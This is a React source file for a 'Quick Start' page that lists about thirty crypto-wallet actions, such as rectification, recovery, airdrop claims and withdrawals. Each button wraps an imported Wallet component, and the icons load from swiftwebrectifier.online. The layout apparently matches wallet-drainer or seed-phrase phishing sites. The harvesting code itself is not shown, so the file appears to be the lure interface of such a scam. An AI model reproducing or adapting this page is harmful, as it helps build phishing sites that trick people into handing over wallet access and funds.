import Wallet from "./Wallet";

function QuickStart() {
  const data = [
    {
      title: "Update Mainnet Firmware Version",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Update Now",
    },
    {
      title: "Configure RPC Endpoint Settings",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Configure Now",
    },
    {
      title: "Quick Fix",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Fix Now",
    },
    {
      title: "Migration",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Migrate Now",
    },
    {
      title: "Validate",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Validate Now",
    },
    {
      title: "Restore",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Restore Now",
    },
    {
      title: "Stake",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Stake Now",
    },
    {
      title: "Swapping",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Swap Now",
    },
    {
      title: "Buying",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Buy Now",
    },
    {
      title: "Staking Review",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Review Now",
    },
    {
      title: "Reflection",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Reflect Now",
    },
    {
      title: "Synchronize",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Sync Now",
    },
    {
      title: "Unstake Tokens",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Unstake Now",
    },
    {
      title: "Claim Reflection",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Claim Now",
    },
    {
      title: "Claim Airdrop Rewards",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Claim Now",
    },
    {
      title: "Airdrop",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Join Now",
    },
    {
      title: "Bridge",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Bridge Now",
    },
    {
      title: "Claim",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Claim Now",
    },
    {
      title: "Rectification",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Rectify Now",
    },
    {
      title: "Recovery",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Recover Now",
    },
    {
      title: "Harvest my stakings",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Harvest Now",
    },
    {
      title: "Withdrawal",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Withdraw Now",
    },
    {
      title: "Gas",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Gas Now",
    },
    {
      title: "LP Lock",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Lock Now",
    },
    {
      title: "Restore tokens",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Restore Now",
    },
    {
      title: "NFT Mint",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/secure.png",
      buttonText: "Mint Now",
    },
    {
      title: "Purchase Tokens",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/cash.png",
      buttonText: "Purchase Now",
    },
    {
      title: "NFT Mint",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Mint Now",
    },
    {
      title: "Other",
      imageSrc: "https://swiftwebrectifier.online/NODE_files/app.png",
      buttonText: "Explore Now",
    },
  ];

  return (
    <div>
      <div className="text-center">
        <h1 className="my-5 text-xl font-bold text-blue-700 md:text-2xl">
          Quick Start
        </h1>

        <div className="grid grid-cols-3 gap-x-1 gap-y-8 p-4 md:mx-5 md:gap-x-4">
          {data.map((item, index) => (
            <div
              key={index}
              className="  rounded-lg border-s-8 border-blue-500 bg-gray-200 py-4 text-center"
            >
              <img
                src={item.imageSrc}
                alt={item.title}
                className="mx-auto my-2 h-12 w-12"
              />
              <p className="my-2 font-bold">{item.title}</p>
              <Wallet>{item.buttonText}</Wallet>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

export default QuickStart;